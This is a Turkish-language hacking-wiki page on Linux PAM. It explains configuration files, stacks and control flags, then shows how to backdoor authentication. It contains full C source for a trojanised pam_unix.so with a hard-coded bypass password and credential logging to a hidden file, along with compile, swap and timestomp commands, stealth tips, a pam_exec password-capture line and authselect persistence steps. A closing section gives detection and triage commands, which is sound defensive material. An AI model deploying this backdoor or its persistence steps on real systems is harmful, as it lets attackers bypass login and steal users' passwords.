# PAM - Takılabilir Kimlik Doğrulama Modülleri

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Pluggable Authentication Modules)**, **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliğini doğrulayan** ve erişimlerini çeşitli kriterlere göre kontrol eden bir güvenlik mekanizması olarak işlev görür. Yalnızca yetkili kullanıcıların belirli hizmetleri kullanabilmesini sağlarken, sistemin aşırı yüklenmesini önlemek için kullanımlarını potansiyel olarak sınırlayan dijital bir güvenlik görevlisine benzer.

#### Yapılandırma Dosyaları

- **Solaris**, eski merkezi `/etc/pam.conf` dosyasını destekler; ancak güncel yönergeler `/etc/pam.d` altındaki hizmet dosyalarının kullanılmasını tercih eder.<sup>[[10]](#references)</sup>
- **Linux sistemleri**, hizmete özgü yapılandırmaları `/etc/pam.d` içinde saklayan dizin yaklaşımını tercih eder. Örneğin, login hizmetinin yapılandırma dosyası `/etc/pam.d/login` konumunda bulunur.<sup>[[1]](#references)</sup>

login hizmeti için bir PAM yapılandırması şu şekilde görünebilir:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Yönetim Alanları**

Bu alanlar veya yönetim grupları, her biri authentication ve session management sürecinin farklı yönlerinden sorumlu olan **auth**, **account**, **password** ve **session** bileşenlerini içerir:<sup>[[1]](#references)</sup>

- **Auth**: Kullanıcı kimliğini doğrular; çoğunlukla parola ister.
- **Account**: Grup üyeliği veya günün belirli saatleriyle ilgili kısıtlamalar gibi koşulları kontrol ederek hesap doğrulamasını gerçekleştirir.
- **Password**: Karmaşıklık kontrolleri veya dictionary attacks prevention dahil olmak üzere parola güncellemelerini yönetir.
- **Session**: Dizinleri mount etmek veya resource limits ayarlamak gibi bir service session'ın başlangıcı ya da sonu sırasında gerçekleştirilen işlemleri yönetir.

#### **PAM Module Controls**

Controls, module'ün başarıya veya başarısızlığa verdiği yanıtı belirleyerek genel authentication sürecini etkiler. Bunlar şunlardır:<sup>[[1]](#references)</sup>

- **Required**: Required module'ün başarısız olması, ancak kendisinden sonraki tüm module'ler kontrol edildikten sonra nihai bir başarısızlıkla sonuçlanır.
- **Requisite**: Başarısızlık durumunda sürecin derhal sonlandırılması.
- **Sufficient**: Daha önceki hiçbir `required` module başarısız olmadıysa başarı hemen döndürülür ve aynı management group içindeki kalan module'ler atlanır.
- **Optional**: Yalnızca stack içindeki tek module olması durumunda başarısızlığa neden olur.

#### Saldırı Açısından Önemli Semantics

PAM'i analiz ederken veya değiştirirken, **eklenen bir kuralın konumu** onu hangi stack'in göreceğini belirler:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` ve `substack` kuralları diğer dosyalardan alır; bu nedenle `sshd` dosyasını düzenlemek yalnızca SSH'yi etkilerken `system-auth`, `common-auth` veya başka bir paylaşılan stack'i düzenlemek aynı anda birden fazla service'i etkileyebilir.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM ayrıca `[success=1 default=ignore]` gibi bracketed controls'ü destekler. Bunlar, görünür biçimde `pam_unix.so` yerine geçmek yerine, başarılı bir custom check sonrasında bir veya daha fazla module'ü **atlamak** için abuse edilebilir.<sup>[[1]](#references)</sup>
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) veya varsayılan PAM module directory'sine göre **relative** olabilir. Modern Linux sistemlerinde gerçek directory'ler genellikle `/lib/security`, `/lib64/security`, `/usr/lib/security` veya `/usr/lib/x86_64-linux-gnu/security` gibi multiarch path'lerdir.<sup>[[1]](#references)[[14]](#references)</sup>

Quick operator takeaway: patch uygulamadan önce her zaman **full service graph**'ı çıkarın. Örneğin bazı distro'larda `sshd -> password-auth -> system-auth`, diğerlerinde ise `sshd -> system-remote-login -> system-login -> system-auth` kullanılması, aynı one-line implant'ın amaçlanandan çok daha geniş bir alana yayılabileceği anlamına gelir.<sup>[[1]](#references)[[13]](#references)</sup>

#### Örnek Senaryo

Birden fazla auth module içeren bir setup'ta süreç katı bir sırayı izler. `pam_securetty` module'ü login terminal'inin yetkisiz olduğunu tespit ederse root login'leri engellenir; ancak "required" status'ü nedeniyle tüm module'ler yine de işlenir. `pam_env`, environment variable'ları ayarlayarak potansiyel olarak user experience'ı iyileştirir. `pam_ldap` ve `pam_unix` module'leri kullanıcıyı authenticate etmek için birlikte çalışır; `pam_unix`, daha önce sağlanmış bir password'ü kullanmayı deneyerek authentication yöntemlerinde verimliliği ve esnekliği artırır.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## PAM'e Backdoor Yerleştirme – `pam_unix.so` Hooking

High-value Linux environment'larında kullanılan klasik bir persistence trick, legitimate PAM library'yi trojanised bir drop-in ile **değiştirmektir**. PAM stack'inin `pam_unix.so` yüklediği bir host'ta SSH veya console authentication, `pam_sm_authenticate()` entry point'ini çağırabilir; malicious bir replacement credentials'ı capture edebilir veya *magic* password bypass uygulayabilir.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
Aşağıdaki sketch, Linux-PAM'in `pam_sm_authenticate()` service entry point'ini ve authentication token'a erişmek için `pam_get_authtok()`'u kullanır.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Derleyin ve gizlice değiştirin (replacement/timestomp pattern, Unit 42 tarafından belgelenmiştir). Hem wrapper'da hard-coded olarak belirtilen backup path'ini hem de aşağıdaki komutları hedefin gerçek PAM module directory'sine göre ayarlayın:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec İpuçları
1. **Atomic overwrite** – kısmen yazılmış bir authentication module bırakmamak için eksiksiz bir library'yi geçici bir dosyaya yazın ve yerinde değiştirmek üzere yeniden adlandırın.
2. Unit 42'nin AuthDoor analizinde `/usr/bin/.dbus.log` gibi bir path gözlemlendi; bu nedenle aynı zamanda yararlı bir hunting indicator'dır.<sup>[[2]](#references)</sup>
3. Diğer yönetim işlemlerinin çalışmaya devam etmesi için PAM stack'in beklediği entry point'leri (örneğin, `pam_sm_authenticate` ve `pam_sm_setcred`) koruyun.<sup>[[11]](#references)[[18]](#references)</sup>

### Tespit
Package-integrity kontrolleri için RPM, kurulu dosya metadata'sını doğrular; `debsums -s` checksum hatalarını bildirir ve triage bloğundaki `dpkg -S` package ownership sorgusu yapar; audit watch syntax ise bir path'e yapılan yazma işlemlerini ve attribute değişikliklerini kaydeder.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` için MD5/SHA256 değerlerini distro package ile karşılaştırın.
* Manuel hashing yapmadan değiştirilmiş library'leri tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` kullanın.
* `/lib/security/` altında world-writable veya alışılmadık ownership olup olmadığını kontrol edin.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen module'ler için PAM config'lerini grep ile tarayın: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Hızlı triage komutları (compromise sonrası veya threat hunting sırasında)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Persistence için `pam_exec` Kötüye Kullanımı
`pam_unix.so` dosyasını değiştirmek yerine, `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklemek daha hafif bir yaklaşımdır; böylece bu PAM satırına ulaşan bir invocation, normal stack'i bozmadan bir helper çalıştırır.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`, `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` ve `PAM_TYPE` gibi PAM metadata bilgilerini environment variables içinde alır. `expose_authtok` ile helper, `auth` veya `password` aşamalarında parolanın `PAM_MAX_RESP_SIZE` byte'a kadar olan kısmını `stdin` üzerinden okuyabilir. Helper'ın real UID yerine effective UID ile çalışmasını istiyorsanız `seteuid` ekleyin.<sup>[[4]](#references)</sup>

Pratik notlar, `pam_exec` için belgelenen module types ve `type=` filter'ını izler:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...`, socket'leri yeniden açmak veya detached daemon başlatmak gibi **post-login actions** için daha uygundur.
- `auth optional pam_exec.so quiet expose_authtok ...`, session açılmadan önce çalıştığı için genellikle **credential capture** amacıyla tercih edilir.
- `type=session` veya `type=auth`, çalıştırmayı belirli bir PAM aşamasıyla sınırlandırmak ve gereksiz çift çalıştırmayı önlemek için kullanılabilir.

### Distro araçlarından etkilenmeden kalma: `authselect`

`authselect` kullanan RHEL ve Fedora-family sistemlerde `/etc/pam.d/system-auth` veya `/etc/pam.d/password-auth` gibi oluşturulan dosyalarda doğrudan yapılan değişiklikler **`authselect` tarafından üzerine yazılabilir**. Kalıcılık için operatörler genellikle `/etc/authselect/custom/<profile>/` altındaki etkin custom profile'ı patch'ler ve ardından yeniden seçer.<sup>[[5]](#references)[[19]](#references)</sup>

Root yetkiniz olduğunda tipik workflow:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Bu, hem offense hem de triage açısından önemlidir: `/etc/pam.d/system-auth` dosyası `Generated by authselect` ve `Do not modify this file manually` banner'larını içeriyorsa, gerçek persistence noktası `/etc/pam.d/` yerine `/etc/authselect/custom/` altında bulunabilir.<sup>[[5]](#references)</sup>

### Sahada gözlemlenen güncel tradecraft

**Plague** Linux backdoor'u hakkında 2025'te yayımlanan güncel raporlar, aynı temel fikrin daha ileri bir biçimini gösterdi: **static bypass password** içeren kötü amaçlı bir PAM bileşeni ve login sonrasında session izlerini azaltmak için SSH ile ilgili environment variable'ların ve shell history'nin (`HISTFILE=/dev/null`) temizlenmesi.<sup>[[3]](#references)</sup> Bu, backdoor mantığı PAM içinde bulunabilirken stealth artifact'lerinin yalnızca authentication başarıyla tamamlandıktan **sonra** ortaya çıkabilmesi nedeniyle yararlı bir hunting pattern'dir.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Gizli Operatörün Playbook'u: Global Telekomünikasyon Ağlarına Sızma - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux için Yeni Keşfedilen PAM Tabanlı Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect kullanarak user authentication yapılandırma - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4'te Authentication Yönetimi](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Kılavuzu - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package file listesi: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Değişiklikler/Authselect'i Zorunlu Hale Getirme - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
